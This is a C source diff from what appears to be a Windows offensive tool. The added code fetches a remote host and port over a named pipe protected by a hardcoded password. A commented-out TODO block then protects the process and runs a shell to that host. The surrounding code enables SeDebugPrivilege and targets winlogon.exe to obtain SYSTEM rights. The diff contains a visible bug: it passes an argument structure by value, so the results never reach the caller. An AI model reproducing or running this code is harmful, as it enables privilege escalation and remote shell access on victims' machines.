@@ -9,6 +9,8 @@
 #include "Tools.h"
 #include "Message.h"
 #include "CheckSystem.h"
+#include "PipeServer.h"
+#include "MgArguments.h"
 
 #define SE_DEBUG_NAME_L	L"SeDebugPrivilege"
 
@@ -41,8 +43,37 @@ BOOL GetTargetHost(WCHAR** argurments, WCHAR* arg0) {
 	return FALSE;
 }
 
+BOOL GetInfoPipeSystem(Arguments listAgrument){
+	PipeDataStruct pipeDataStruct;
+	const char* lpszPipename = "\\\\.\\pipe\\mynamedpipeHigh";
+	const char* password = "SeMf523hqsXxaAy8bUaCRPbW62UT7R4ybXqJZjNVDnKya9ggXJ6UjKku77mB";
+
+	if (SendInfoPipe(&pipeDataStruct, lpszPipename, password)){
+		printf("[-] Result:\n");
+		printf("\t[+] Ip address: %s\n", pipeDataStruct.ipAddress);
+		printf("\t[+] Port: %i\n", pipeDataStruct.port);
+
+		sprintf_s(listAgrument.host, 1024, "%hs", pipeDataStruct.ipAddress);
+		listAgrument.port = pipeDataStruct.port;
+		return TRUE;
+	}
+	return FALSE;
+}
 
 int GetSystem() {
+	// TODO:
+	/*
+	if (!GetTargetHost(&argurments, ProcessToRun)) {
+	 Arguments listAgrument;
+		if(GetInfoPipeSystem(&listAgrument)){
+			ProtectProcess();
+			RunShell(listAgrument);
+		}	
+	}
+	*/
+
+
+
 	WCHAR* TargetProcess = L"winlogon.exe";
 	DWORD pid = GetTargetProcessPID(TargetProcess);
 
